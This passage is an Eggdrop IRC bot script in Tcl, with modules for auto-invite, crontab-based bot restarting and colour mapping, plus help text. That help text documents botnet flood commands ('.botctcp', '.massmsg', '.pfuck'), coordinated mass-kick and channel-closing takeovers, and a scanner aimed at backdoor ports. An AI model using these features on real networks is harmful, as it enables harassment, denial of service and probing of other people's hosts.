		putcmdlog "\#$h\# ainv $f $c"
		set q "Flag needed for "
		if {$c != "all" && [info exists ainv_flag($c)]} {
		    append q "channel [b]$c[b]" ; set q1 $c
		} else { append q "[b]all[b]" ; set q1 "all" }
		append q " is: [b]$ainv_flag($q1)[b]"
		pb $i $q
	    } else {
		if {![validchan $c]} { pb $i "Sorry, '[b]$c[b]' is not a valid channel.." ; return 0 }
		if {![info exists ainv_ch($c)] && $ainv_ch(all) == "none"} {
		    pb $i "Sorry, Auto-Invite is not monitoring channel '[b]$c[b]'.." ; return 0
		}
		if {![validflag $w]} { pb $i "Sorry, '[b]$w[b]' are not valid flags.." ; return 0 }
		putcmdlog "\#$h\# ainv $f $c $w"
		set ainv_flag($c) $w
		if {$c == "all"} { set q $c } else { set q "channel '$c'" }
		bl "Flag needed for $q set to '$w': requested by $h."
		ainv_save
	    }
	}
	"boring" {
	    set c [strl [bi $a 1]] ; set w [strl [bi $a 2]]
	    if {$c == "" || ($w != "" && [lsearch -exact "on off" $w] == -1)} {
		pb $i "Usage: .ainv boring <\#channel> \[on / off]" ; return 0
	    }
	    if {$w == ""} {
		putcmdlog "\#$h\# ainv $f $c"
		set q "Boring mode for "
		if {$c != "all" && [info exists ainv_boring($c)]} {
		    append q "channel [b]$c[b]" ; set q1 $c
		} else { append q "[b]all[b]" ; set q1 "all" }
		append q " is: [b]$ainv_boring($q1)[b]"
		pb $i $q
	    } else {
		if {$c != "all" && ![validchan $c]} {
		    pb $i "Sorry, '[b]$c[b]' is not a valid channel.." ; return 0
		}
		if {![info exists ainv_ch($c)] && $ainv_ch(all) == "none"} {
		    pb $i "Sorry, Auto-Invite is not monitoring channel '[b]$c[b]'.." ; return 0
		}
		putcmdlog "\#$h\# ainv $f $c $w"
		set ainv_boring($c) $w
		if {$c == "all"} { set q $c } else { set q "channel '$c'" }
		bl "Boring mode for $q set to '$w': requested by $h."
		ainv_save
	    }
	}
	"log" {
	    set c [strl [bi $a 1]] ; set w [strl [bi $a 2]]
	    if {$c == "" || ($w != "" && [lsearch -exact "on off" $w] == -1)} {
		pb $i "Usage: .ainv log <\#channel> \[on / off]" ; return 0
	    }
	    if {$w == ""} {
		putcmdlog "\#$h\# ainv $f $c"
		set q "Verbose Logging for "
		if {$c != "all" && [info exists ainv_log($c)]} {
		    append q "channel [b]$c[b]" ; set q1 $c
		} else { append q "[b]all[b]" ; set q1 "all" }
		append q " is: [b]$ainv_log($q1)[b]"
		pb $i $q
	    } else {
		if {$c != "all" && ![validchan $c]} {
		    pb $i "Sorry, '[b]$c[b]' is not a valid channel.." ; return 0
		}
		if {![info exists ainv_ch($c)] && $ainv_ch(all) == "none"} {
		    pb $i "Sorry, Auto-Invite is not monitoring channel '[b]$c[b]'.." ; return 0
		}
		putcmdlog "\#$h\# ainv $f $c $w"
		set ainv_log($c) $w
		if {$c == "all"} { set q $c } else { set q "channel '$c'" }
		bl "Verbose Logging for $q set to '$w': requested by $h."
		ainv_save
	    }
	}
	"clear" {
	    dccsimul $i ".clear ainv"
	}
	"help" {
	    dccsimul $i ".help ainv"
	}
	default {
	    if {$f != "all" && ![info exists ainv_ch($f)] && ![validchan $f]} {
		pb $i "Sorry, '[b]$f[b]' is not a valid channel." ; return 0
	    }
	    if {$t == ""} {
		putcmdlog "\#$h\# ainv $f"
		if {![info exists ainv_ch($f)]} { set f "all" }
		set q "Active Channel \t: [b]$f[b] --> [b][br $ainv_ch($f) 0 end][b] (flags:[b]"
		if {[info exists ainv_flag($f)]} {
		    append q $ainv_flag($f)
		} else { append q $ainv_flag(all) }
		append q "[b], boring:[b]"
		if {[info exists ainv_boring($f)]} {
		    append q $ainv_boring($f)
		} else { append q $ainv_boring(all) }
		append q "[b], log:[b]"
		if {[info exists ainv_log($f)]} {
		    append q $ainv_log($f)
		} else { append q $ainv_log(all) }
		append q "[b])" ; pb $i $q
	    } else {
		putcmdlog "\#$h\# ainv $f $t"
		set l ""
		foreach c $t {
		    if {$c != "none" && ![validchan $c]} {
			pb $i "Warning: '$c' is not a valid channel: skipping.."
		    } else {
			lappend l $c
		    }
		}
		if {$l == ""} { set l none }
		set ainv_ch($f) $l
		ainv_save
		bl "Set Auto-Invite chanlist for '$f' to: '$l': requested by $h."
	    }
	}
    }
}
al init "Auto-Invite System loaded and ready!"
set ainv_module_loaded 1}
set smart_cron {set m "cron"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
set ${m}_module_name "Crontab Manager"
set ${m}_module_bind "n"
set ${m}_help_list "{dcc $m n} {dcc m${m} n}"

set ${m}_module_init {
    {ver 1 "1.3" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {auto 0 "off" "AutoAdd Myself" "%k:on off"}
    {cmd 0 "crontab" "Command" "" permowner}
    {list 0 "-l" "List Switch"}
    {del 0 "-r" "Delete Switch"}
    {time 0 "random" "Time Offset" "%d:0 9|random"}
    {mail 0 "on" "Email Notifier" "%k:on off"}
}

set ${m}_noconf_commands {
    check {show 1} addme delme erase
}
module_init $m ; eval [module_globals $m]

proc ${m}_what_script {h m v a n w} {
    if {$v != "time"} { return }
    eval [module_globals $m] ; set r "" ; if {$cron_time != "random"} { set r "minutes" } ; return $r
}

proc ${m}_check_script {m} {
    global wdir
    set script {#!/bin/sh
if test $# -lt 4
then
 echo "Usage : botchk botdir file.conf botname userfile"
 exit 0
fi
botdir=$1
botscript="eggdrop $2"
botname=$3
userfile=$4 
cd "$botdir"
if test -r pid.$botname; then
 botpid=`cat pid.$botname`
 if `kill -CHLD $botpid >/dev/null 2>&1`
 then
 exit 0
fi
echo "Stale pid.$botname file (erasing it)"
rm -f pid.$botname
fi
echo "Couldn't find the bot running.  Reloading it..."
if test -r ./$userfile
then
 ./$botscript
 exit 0
fi
if test -r $userfile~new
then
 echo "Userfile missing.  Using last saved userfile..."
 mv $userfile~new $userfile
 ./$botscript
 exit 0
fi
if test -r $userfile~bak
then
 echo "Userfile missing.  Using backup userfile..."
 cp $userfile~bak $userfile
 ./$botscript
 exit 0
fi
echo "No userfile.  Could not reload the bot.."
exit 0
}
if {![file exists $wdir/smart.botchk]} {
    set f [open $wdir/smart.botchk w] ; puts $f $script ; close $f
    file attributes $wdir/smart.botchk -permissions 00755
    al $m "[module_name $m]: Created bot checker shell script"
}
unset script
}

proc pipe_test {s} { regsub -all \\| $s \\\\| s ; return $s }

proc ${m}_check_entry {c} {
    global config userfile ; set r 0
    foreach l [split $c \n] {
	if {[string match ?,*[pipe_test [pipe_test $config]]*[pipe_test [pipe_test $userfile]]* $l]} {
	    set r 1 ; break
	}
    }
    return $r
}

proc ${m}_report {i m w h b l r} {
    global bnick
    if {[llength $b] == 1 && [strl $b] != [strl $bnick]} {
	putbot $b "$m $h $i module_status_report $r"
	set q "[module_name $m] replied to '[c m]$w[c]' request made by $h (from $b)" ; al $m $q
    } else {
	if {$l == $m} {
	    if {$i != 0} { pa $i $r } else { al $m $r }
	} else {
	    bot:module_interface $bnick 0 "$h $i module_status_report $r"
	}
    }
}

proc ${m}_check {i m w h b lb} {
    global errorInfo pa bnick wdir wpref config userfile ; set pa($i) $m ; eval [module_globals $m]
    set r "" ; if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    ${m}_check_script $m ; catch { exec $cron_cmd $cron_list } c
    if {[info exists o]} { set errorInfo $o } else { set errorInfo "" } ; set y [${m}_check_entry $c]
    switch -exact $w {
	"show" {
	    set q "Current crontab file contains:" ; pa $i $q
	    set r [string repeat "-" [string length $q]] ; pa $i $r
	    foreach l [split $c \n] { putdcc $i $l }
	}
	"check" {
	    set r "Crontab entry "
	    if {$y} { append r "[c o][b]found[b][c]" } else { append r "[b][c e]not found[c][b]" }
	    append r " for myself!"
	}
	"addme" {
	    if {$y} {
		set r "Crontab entry already [c o][b]found[b][c] for myself!"
	    } else {
		if {$cron_time == "random"} { set n [rand 10] } else { set n $cron_time }
		set s [pipe_test "$n,1$n,2$n,3$n,4$n,5$n * * * * [pwd]/$wdir/smart.botchk [pwd] $config $bnick $userfile"]
		if {$cron_mail == "off"} { append s " >/dev/null 2>&1" }
		set e ${wpref}.crontab_entry ; set f [open $e w]
		if {$c != "" && ![string match -nocase "*no crontab for*" $c]} {
		    foreach l [split $c \n] { if {![string match "\#*" $l]} { puts $f $l } }
		}
		puts $f $s ; close $f ; catch { exec $cron_cmd $e } c
		file delete -force $e ; if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
		set r "[c o][b]Added[b][c] Crontab entry for myself!"
	    }
	}
	"delme" {
	    if {$y} {
		set e ${wpref}.crontab_entry ; set f [open $e w]
		foreach l [split $c \n] {
		    if {![string match "\#*" $l] && ![${m}_check_entry $l]} { puts $f $l }
		}
		close $f ; catch { exec $cron_cmd $e } c
		file delete -force $e ; if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
		set r "[c o][b]Removed[b][c] Crontab entry for myself!"
	    } else {
		set r "[b][c e]No crontab[b][c] entry found for myself.."
	    }
	}
	"erase" {
	    catch { exec $cron_cmd $cron_del } c
	    if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	    set r "[c o][b]Removed[b][c] Crontab file!"
	}
	default {
	    if {[expr $${m}_auto] == "on" && !$y} { ${m}_check $i $m addme $h $b $lb } ; return 0
	}
    }
    ${m}_report $i $m $w $h $b $lb $r
}

${m}_check 0 $m auto [module_name $m] $bnick $m

proc ${m}_module_setup {h i m l G g w p} {
    global bnick lastbind ; set a [module_array_vars $m] ; eval [module_globals $m]
    switch -exact $w {
	"check" - "show" - "addme" - "delme" - "erase" {}
	default { module_save_changes $h $i $m $l $G $g $w $p $a ; set G $bnick }
    }
    ${m}_check $i $m $w $h $G $lastbind
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m
}
set smart_cron_help {%{help=cron}%{+m|+m}
###  %b.cron%b
   Standard Interface to Crontab Manager Module.
   Displays module status and saved settings.
###  %b.cron -v%b
   Displays module status, complete command list and quick-help.
###  %b.cron ver%b
   Displays Crontab Manager Module version.
###  %b.cron author%b
   Displays informations about Module Author.
###  %b.cron clear%b
   Removes Crontab Manager configuration file.
See also: '.help clear'
###  %b.cron auto%b [on / off]
   Shows (or sets) Auto Add facility for Crontab Manager: while
   enabled, everytime the bot is rehashed or restarted, Crontab
   Manager will automatically try to find a valid entry for the
   bot in crontab file and, if no entry is found, a new one is
   created and saved.
###  %b.cron cmd%b [command]
   Displays (or changes) current Crontab shell command.
   Default is 'crontab' (most common on the most known shells).
###  %b.cron list%b [switch]
   Shows (or sets) the command-line switch needed by shell command
   'crontab' to list user's crontab (see 'man crontab').
   Default is '-l' (used by 'vcron' package).
###  %b.cron del%b [switch]
   Displays (or changes) the command-line switch needed by shell
   command 'crontab' to delete user's crontab (see 'man crontab').
   Default is '-r' (used by 'vcron' package).
###  %b.cron time%b [offset#]
   Shows (or sets) the default time offset used to add bot entries
   in crontab file. Valid range for offset# is 0 - 9 or 'random'.
   Default is 'random'.
###  %b.cron mail%b [on / off]
   Enables or disables crontab email notifications (most crontabs
   will email you when something goes wrong with your crontab).
   Default is 'on'.
###  %b.cron check%b
   Checks crontab file for a valid entry for the bot and shows you
   the results, without modifying any crontab configuration.
###  %b.cron show%b
   Displays your current crontab file (if it exists).
###  %b.cron addme%b
   Will try to add a crontab entry for the bot, if it is not already
   present in your crontab file.
###  %b.cron delme%b
   Will try to remove the bot entry from your crontab file, if it is
   found in your crontab file.
###  %b.cron erase%b
   Deletes your crontab file.
%{help=mcron}%{+m|+m}
###  %b.mcron%b ...
   Standard Mass interface for Crontab Manager.
See also: '.help mass'
}
set smart_color {set m "color"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
set ${m}_module_name "Color Mapper"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m}"

set ${m}_module_init {
    {ver 1 "1.1" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {status 0 "on" "Status" "%k:on off" n}
    {map(l) 0 10 "Mapping" "%d:0 15|-:%k:l e o m n" n}
    {map(e) 0 4 "Mapping" "%d:0 15|-:%k:l e o m n" n}
    {map(o) 0 3 "Mapping" "%d:0 15|-:%k:l e o m n" n}
    {map(m) 0 7 "Mapping" "%d:0 15|-:%k:l e o m n" n}
    {map(n) 0 13 "Mapping" "%d:0 15|-:%k:l e o m n" n}
}

set ${m}_noconf_commands {
    {list 1}
}

module_init $m ; eval [module_globals $m]

proc c {{n ""}} {
    global color_map color_status ; if {$color_status == "off"} { return } ; set q \003
    switch -exact -- $n {
	"" - "-" {}
	"l" - "e" - "o" - "m" - "n" { set q [c $color_map($n)] }
	default { append q $n }
    }
    return $q
}

proc test_color {c} {
    global color_map
    return "[unif_len { } [expr 3 - [string length $color_map($c)]] r]([c $c]color[c])"
}

proc list_colors {i} {
    global pa ; set pa($i) color
    for {set n 0} {$n < 16} {incr n} {
	pa $i "[c $n]This is color number [unif_len $n 2 r] ([b]Bold variant[b])[c]"
    }
}

proc ${m}_what_script {h m v a n w} {
    if {$v != "map"} { return }
    eval [module_globals $m] ; set r ""
    switch -exact -- $w {
	"status" - "info" {
	    switch -exact -- $a {
		l { set q logos }
		e { set q errors }
		o { set q "ok stuff" }
		m { set q modules }
		n { set q notes }
		default { set q other }
	    }
	    set r "[unif_len { } [expr 3 - [string length $color_map($a)]] r]([c $a][unif_len $q 9 c][c])"
	}
	"parse" { set r "color" }
	default {}
    }
    return $r
}

proc ${m}_module_setup {h i m l G g w p} {
    global bnick ; set a [module_array_vars $m] ; eval [module_globals $m]
    switch -exact $w {
	list { list_colors $i }
	default { module_save_changes $h $i $m $l $G $g $w $p $a }
    }
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m}
set smart_color_help {%{help=color}%{+m|+m}
###  %b.color%b
   Standard Interface to Color Mapper Module.
   Displays module status and saved settings.
See also: .mcolor
###  %b.color -v%b
   Displays module status, complete command list and quick-help.
###  %b.color ver%b
   Displays Color Mapper Module version.
###  %b.color author%b
   Displays informations about Module Author.
###  %b.color clear%b
   Removes Color Mapper configuration file.
See also: '.help clear'
###  %b.color status%b [on / off]
   Shows (or changes) Color Mapper status. 'off' will completely
   disable colors (try also '.setup color unload').
Note: Color Mapper Module will still be loaded with status 'off'.
See also: .setup
###  %b.color map%b [kind] [color#]
   Sets the specified color for the specified kind of event.
   Kind can be one in the list 'l m e n o':
   l: logo color (TCL logo and related events);
   m: modules related events color (interfaces, etc);
   e: errors and bad behaviours color;
   n: notices color (warnings, etc);
   o: ok / permitted / good stuff color.
   color# is a numeric value in the range 0 - 15 or '-' (no color).
###  %b.color list%b
   Displays a list of available colors to make it easier the
   appropriate choice.
%{help=mcolor}%{+m|+m}
###  %b.mcolor%b ...
   Standard Mass interface for Color Mapper Module.
See also: '.help mass'
}
set smart_help {# Help System

global help_module_loaded smart_help smarthelp
global wdir help_smart_list help_modules_list all_modules_loaded

set help_smart_list {
    {msg !ping o|o}
    {dcc probe -} {dcc dns -} {dcc notes -} {dcc date -} {dcc flagnote -} {dcc ver -} {dcc news -}
    {dcc ping o|o} {dcc aup o|o} {dcc botver o|o} {dcc count o|o} {dcc fmsg o|o} {dcc fnotice o|o}
    {dcc channels o} {dcc notice o|o} {dcc ctcp o|o} {dcc dcc o} {dcc allinv o|o} {dcc tlock o|o}
    {dcc tunlock o|o} {dcc bounce o|o} {dcc wallop o|o} {dcc check o} {dcc aop o} {dcc adeop o}
    {dcc akick o} {dcc akb o} {dcc botstats o|m} {dcc chbot o} {dcc amsg o} {dcc anotice o}
    {dcc autoadd t} {dcc tolink t} {dcc linkall t} {dcc brehash t} {dcc mrehash t} 
    {dcc brestart t} {dcc ajump t} {dcc bjump t} {dcc mjump t} {dcc m+host t|m} {dcc m-host t|m}
    {dcc +server t} {dcc -server t}
    {dcc msave t|m} {dcc botping t} {dcc downbots t} {dcc mchaddr t} {dcc mbotattr t} {dcc mop m|m}
    {dcc mdeop m|m} {dcc mkick m|m} {dcc mchattr m|m} {dcc mchanset m|m} {dcc dcc m|m}
    {dcc clone m|m} {dcc repeat m|m} {dcc onjoin m|m} {dcc logs m|m} {dcc last m|m} {dcc vhosts m|m}
    {dcc close m|m} {dcc aclose m|m} {dcc open m|m}
    {dcc join m} {dcc part m} {dcc ndcc m} {dcc m+ban m} {dcc m-ban m}
    {dcc checkpass m} {dcc mchpass m} {dcc dcclist m} {dcc crypt m} {dcc decrypt m} {dcc massnotice m}
    {dcc massmsg m} {dcc botctcp m} {dcc scan m} {dcc pfuck m} {dcc mail m} {dcc telnet m} {dcc orph m}
    {dcc b64 m} {dcc senduser n} {dcc clear n} {dcc bjoin n} {dcc bpart n} {dcc mjoin n} {dcc mpart n}
    {dcc madd n} {dcc mkill n} {dcc m+bot n} {dcc m-bot n} {dcc idle n} {dcc flood n} {dcc get n}
    {dcc ls n} {dcc mv n} {dcc find n} {dcc cat n} {dcc cp n} {dcc rm n} {dcc autorem n} {dcc spawn n}
    {dcc mrestart n} {dcc ainv n} {dcc gzip n} {dcc gunzip n} {dcc send n} {dcc msend n} {dcc upgrade n}
    {dcc mupgrade n} {dcc dccfake n}
}

set help_modules_list "" ; set all_modules_loaded 1
foreach m [setup:mods] {
    set ms [file join $wdir smart.${m}.tcl]
    if {[file exists $ms]} {
	set o 0; set hl ${m}_help_list; if {![info exists $hl]} { global $hl }
	if {[info exists $hl]} { set o 1; set l [expr $$hl] }
	if {!$o} {
	    set f [open $ms r]
	    while {!$o && ![eof $f]} {
		set l [gets $f] ; if {[eof $f]} { break }
		if {[string match "set *_help_list *" $l]} { set o 1 ; break }
	    }
	    close $f ; unset f
	    if {$o} { eval $l ; set l [expr $${m}_help_list] } else { set l "" }
	}
	set d ${m}_module_loaded ; global $d ; set D [expr $${d}] ; set L ""
	foreach L $l { append help_modules_list "{$L $D} " }
	if {!$D} { set all_modules_loaded 0 } ; unset L D
    }
    unset o l ms
}
unset m

proc format_help {l n} {
    set q "  [b]" ; set j 0
    foreach h $l {
	set Q [unif_len [lindex $h 0] 13] ; if {![lindex $h 1]} { set Q "[c e][b]$Q[b][c]" } ; append q $Q
	incr j ; if {$j == $n} { append q "[b]\n  [b]" ; set j 0 }
    }
    if {[string index $q [expr [string length $q] -4]] == "\n"} {
	set q [string range $q 0 [expr [string length $q] - 6]]
    }
    return "$q[b]\n"
}

proc get_bind_kind {f g} {
    switch -exact -- $f {
	"-" { set q a }
	"" - "o" - "t" - "m" - "n" { set q $f }
	default { set q x }
    }
    if {$g && $q != "a" && $q != "x"} { set q [stru $q] } ; return $q
}

proc get_helpflag_kind {k} {
    set k [string index $k 1] ; set q "[u]For "
    switch -exact -- $k {
	a { append q "all" }
	o { append q "channel ops" }
	O { append q "ops" }
	T { append q "botnet masters" }
	m { append q "channel masters" }
	M { append q "masters" }
	n { append q "channel owners" }
	N { append q "owners" }
	default { append q "others" }
    }
    return "$q:[u]\n"
}

bind filt - ".help smart" dcc:help
proc dcc:help {i a} {
    global bnick version help_smart_list help_modules_list all_modules_loaded
    if {[strl [lindex $a 1]] != "smart"} { return $a }
    putcmdlog "\#[idx2hand $i]\# help smart" ; set bv "$bnick, [lindex $version 0], [boja] TCL v [rv]"
    set msg "[c 10][b]MSG COMMANDS[b][c] for $bv:\n" ; set dcc "[c 10][b]DCC COMMANDS[b][c] for $bv:\n"
    set kinds "ma mo mO mT mm mM mn mN mx da do dO dT dm dM dn dN dx" ; foreach k $kinds { set $k "" }
    foreach c "$help_smart_list $help_modules_list" {
	set f [split [lindex $c 2] |] ; set gf [lindex $f 0] ; set lf [lindex $f 1]
	if {[lindex $c 0] == "msg"} { set q m } else { set q d } ; set qg $q ; set ql $q
	append qg [get_bind_kind $gf 1] ; append ql [get_bind_kind $lf 0]
	set Q [lindex $c 1] ; if {[lindex $c 3] == 0} { set Q "$Q 0" } else { set Q "$Q 1" }
	if {[string length $ql] > 1} { lappend $ql $Q }
	if {[string length $qg] > 1} {
	    if {[string length $ql] < 2 || ([string length $ql] > 1 && [lsearch -exact [expr $${ql}] $Q] == -1)} { lappend $qg $Q }
	}
    }
    foreach k $kinds {
	set v [expr $${k}]
	if {$v != ""} {
	    if {[string index $k 0] == "m"} { set q msg } else { set q dcc }
	    append $q [get_helpflag_kind $k] ; append $q [format_help $v 5]
	}
    }
    foreach l "[split $msg \n] [split $dcc \n]" { if {$l != ""} { putdcc $i $l } }
    putdcc $i "You can get help on individual commands: '[b].help <command>[b]'"
    if {!$all_modules_loaded} {
	putdcc $i "[c 4]Marked commands[c] are not available (module dependent, see '.setup')"
    }
}

set smart_help {%{-}%{help=date}%{-}
###  %b.date%b
   Shows current system date. Helpfull when checking logs or
   setting scheduled events like '.aclose'.
See also :.logs, .aclose, .status
%{help=ver}%{-}
###  %b.ver%b
   Returns current TCL version and internet Home Page. Shows also
   the quick link to download latest TCL version.
See also : .botver, .botinfo, .probe, .mail
%{help=news}%{-}
###  %b.news%b [last]
   Displays the TCL Changelog. If option 'last' is specified, only
   Last-Release Changelod is showed.
See also: .help smart
%{help=flagnote}%{-}
###  %b.flagnote%b <flag> [#channel or all] <text>
   Sends the note to all users with the specified flags in the
   specified channels.
See also : .note, .notes, .mail
%{help=wallop}%{+o|+o}
###  %b.wallop%b <#channel> <msg>
   Sends a notice to all +o people in the specified channel.
See also : .notice, .msg
%{help=notice}%{+o|+o}
###  %b.notice%b <nick/#channel> <msg>
   Let ops make bot notice a nick with text.
See also : .massnotice, .msg, .massmsg, .wallop
%{help=aup}%{+o|+o}
###  %b.aup%b
   Will instantly op you on all the bots channels you are +o on.
Note : if you have clones, all clones will be oped too..
See also : .aop, .ainv, .mop
%{help=logs}%{+m|+m}
###  %b.logs%b
   Shows a report of actual logging-parameters..
###  %b.logs get all%b [yournick]
   Sends you ALL available bot's log files.
###  %b.logs get%b <log-filename> [yournick]
   Sends you the specified log file.
Note : If you don't specify your IRC-nickname, logs will
       be sent to your handle in the botnet.
###  %b.logs list%b
   Shows a list of available log files.
%{help=logs}%{+n}
###  %b.logs add%b <#channel> <flags> [log-filename]
   Enable logging for the specified channel with specified
   console-flags or modifyes logging status if already logging
   channel.
###  %b.logs stop%b <log-filename> or all
   Stops logging in the specified filename. Use .logs or
   .logs list to see active logging channels.
   If 'all' is specified, bot will disable ALL logs..
###  %b.logs max%b <max-logs>
   Sets the maximum number og logfiles allowed.
###  %b.logs size%b <filesize>
   Sets the maximum size for logfiles. 0 = no limits.
###  %b.logs timestamp 0 / 1%b
   Enables / disables timestamp logging.
Note : To have a list of loggable flags, see .help console ! ;)
See also : .date, .console, .clear
%{help=ndcc}%{+m}
###  %b.ndcc%b <idx> <message>
   Send a dcc message ( via putdcc ) to the specified dcc-index.
   You can have a list of valid idx using .dcclist
See also : .dcclist, .bounce, .telnet
%{help=aop}%{+o}
###  %b.aop%b <nick>
   Will op the specified nick on all the bot's channels.
See also : .ainv, .aup, .mop
%{help=adeop}%{+o}
###  %b.adeop%b <nick>
   Will deop the specified nick on all the bot's channels.
See also : .akick, .akb
%{help=allinv}%{+o|+o}
###  %b.allinv%b [nick]
   Will invite the specified nick to all the bot's channels. If no
   nick is given, the bots will try to invite you using your handle..
See also : .ainv, .invite, .+invite, .aup, .aop
%{help=akick}%{+o}
###  %b.akick%b <nick>
   Will kick the specified nick from all the bot's channels.
See also : .akb, .adeop
%{help=akb}%{+o}
###  %b.akb%b <nick>
   Will kickban the specified nick from all the bot's channels.
See also : .akick, .adeop
%{help=botstats}%{+o|+m}
    ###  %b.botstats%b [-v]
   Shows some information about botnet status. If '-v' is
   specified, detailed informations including bot names are
   displayed.
See also: .downbots, .tolink, .bots
%{help=chbot}%{+o}
###  %b.chbot%b <botname>
   will relay you via telnet to another bot that your bot knows of,
   whether or not they are currently connected.  your dcc-chat/telnet
   connection to this bot will be relayed to the other bot until the
   other bot drops your relay, or until you send "*bye*" on a line by
   itself.  
see also: .relay, .bots, .bottree
%{help=mop}%{+m|+m}
###  %b.mop%b <#channel>
   Will op all +o users in the specified channel (massop).
See also : .aop, .aup
%{help=mdeop}%{+m|+m}
###  %b.mdeop%b <#channel> [max-bots-timeout or 0] [do]
   Mass deops the specified channel using a smart coordinated
   algorithm thru botnet. Default bots-timeout is 3 seconds.
   If '0' is specified, only current bot will try to deop.
   If no 'do' flag is given, only a prevision will be performed.
See also : .mkick, .mop, .close, .aclose, .open
%{help=mkick}%{+m|+m}
###  %b.mkick%b <#channel> [max-bots-timeout or 0] [do]
   Mass kicks the specified channel using a smart coordinated
   algorithm thru botnet. Default bots-timeout is 3 seconds.
   If '0' is specified, only current bot will try to kick.
   If no 'do' flag is given, only a prevision will be performed.
See also : .mdeop, .mop, .close, .aclose, .open
%{help=close}%{+m|+m}
###  %b.close%b <#channel> [max-bot-ping] [do]
   Mass kicks the specified channel with the '.mkick' algorithm, but
   kicks also ALL non-oped people making channel empty and +sntmi ..
See also : .aclose, .open, .mkick, .mdeop
%{help=aclose}%{+m|+m}
###  %b.aclose%b
   Shows stats about Auto Channel-Close System.
###  %b.aclose all off%b
   Disable auto chan-close for all. ( 'all' is the default value
   used when no channel-specific settings are foung ).
###  %b.aclose all%b <CloseHour[:CloseMinutes]> <OpenHour[:OpenMinutes]>
   Sets close and reopen hours for all.
###  %b.aclose #channel%b <CloseHour[:CloseMinutes]> <OpenHour[:OpenMinutes]>
   Sets close and reopen houts for the specified channel.
###  %baclose #channel all%b
   Unsets channel-specific settings. This means that Auto Channel-Close
   System will use default values ( for 'all' )..
See also : .close, .open, .mkick, .mdeop, .takeover, .mchanset
%{help=open}%{+m|+m}
###  %b.open%b <#channel>
   Opens the specifiel channel enforcing default channel modes
   and setting it -mik ..
See also : .close, .aclose, .chanset, .mchanset
%{help=massnotice}%{+m}
###  %b.massnotice%b <nick / #channel> <message>
   Makes ALL connected bots notice the specified nick or #channel with
   the specified message flooding it.
See also : .massmsg, .flood, .botctcp, .pfuck, .wallop
%{help=massmsg}%{+m}
###  %b.massmsg%b <nick / #channel> <message>
   Makes ALL connected bots message specified nick or #channel with
   specified message flooding it.
See also : .massnotice, .flood, .botctcp, .pfuck, .wallop
%{help=join}%{+m}
###  %b.join%b <#channel> [key]
   Lets the bot join the specified channel (using key if specified).
See also : .mjoin, .part, .mpart, .bjoin, .bpart, .cycle, .mcycle
%{help=part}%{+m}
###  %b.part%b <#channel> [part-message]
   Lets the bot part the specified channel.
See also : .mpart, .join, .mjoin, .bjoin, .bpart, .cycle, .mcycle
%{help=m+host}%{+t|+m}
###  %b.m+host%b <user> <newident@newhost>
   Will add the specified hostmask to nick on ALL connected
   bots, shared and not.
See also : .+host, .m-host, .-host, .sop autoadd, .msave
%{help=m-host}%{+t|+m}
###  %b.m-host%b <user> <oldident@oldhost>
   Will remove the specified hostmask from nick on ALL connected
   bots, shared and not.
See also : .-host, .m+host, .+host, .sop autoadd, .msave
%{help=mchanset}%{+m|+m}
###  %b.mchanset A%b / %bX%b / %bY%b / %bZ%b.. <#channel> <modes>
   Sets +/- toggles for the specified channel ( A = on ALL bots /
   X / Y / Z.. = on X, Y, or Z-flagged bots ) and saves the
   channel file.
###  %b.mchanset A%b / %bX%b / %bY%b / %bZ%b.. <#channel> %bchanmode%b <modes>
   Sets enforced chanmodes for the specified channel ( A = on
   ALL bots, X / Y / Z.. = on X, Y, or Z-flagged bots ) and
   saves the channel file.
See also : .msave, .chaninfo, .chanset, .status, .channel
%{help=msave}%{+t|+m}
###  %b.msave%b
   Global save across botnet.
See also : .save
%{help=tolink}%{+t}
###  %b.tolink%b
   Shows a list of all non-linked bots with hostnames.
See also : .link, .linkall
%{help=linkall}%{+t}
###  %b.linkall%b
   Tries to link every bot that isnt linked already.
See also : .tolink, .link
%{help=downbots}%{+t}
###  %b.downbots%b
   Shows a list of all non-linked bots ( bots who are down ).
See also : .botstat, .bots, .bottree
%{help=ping}%{+o|+o}
###  %b.ping%b <nick>
   CTCP-pings the specified nick and returns the reply-time.
%{help=ping}%{+m}
See also : .botping, .pfuck, .flood
%{help=botping}%{+t}
###  %b.botping%b
   Pings all the bots in the botnet over telnet, which has
   nothing to do with irc lag. Helpfull with finding lagged
   shells and dead bots.
###  %b.botping%b [bot]
   If a bot nick is specified, pings only the specified bot.
See also : .ping, .botctcp, .pfuck, .flood
%{help=botctcp}%{+m}
###  %b.botctcp%b <nick / #channel>
   Ctcp floods the specified nick or #channel with ALL connected
   bots.
See also : .flood, .pfuck, .massmsg, .massnotice
%{help=mrehash}%{+t}
###  %b.mrehash A%b
   Makes a rehash on ALL connected bots.
###  %b.mrehash X%b / %bY%b / %bZ%b...
   Makes a rehash on X, Y, or Z-flagged bots.
See also : .rehash, .brehash, .restart, .brestart, .mrestart
%{help=mrestart}%{+n}
###  %b.mrestart A%b
   Makes a restart on ALL connected bots.
###  %b.mrestart X%b / %bY%b / %bZ%b...
   Makes a restart on X, Y, or Z-flagged bots.
See also : .restart, .brestart, .rehash, .brehash, .mrehash
%{help=ajump}%{+t}
###  %b.ajump%b [%bon%b] or [%boff%b]
   Just another bind to '.sop ajump'..
See also : .jump, .sop, .msop, .servers, .mjump, .bjump, .+server, .-server, .idle
%{help=scan}%{+m}
###  %b.scan%b <hostname/ip-address>
   Scans the specified host at the most interesting ports ( 12345,
   31337, 1080, 143)... >:D
###  %b.scan%b <hostname/ip-address> [port]
   Scans the specified host at the specified port.
###  %b.scan%b <hostname/ip-address> [port1] [port2]
   Scans the specified host on all ports from port1 to port2.
%{help=count}%{+o|+o}
###  %b.count%b
   Returns the number of registered users in bot's database.
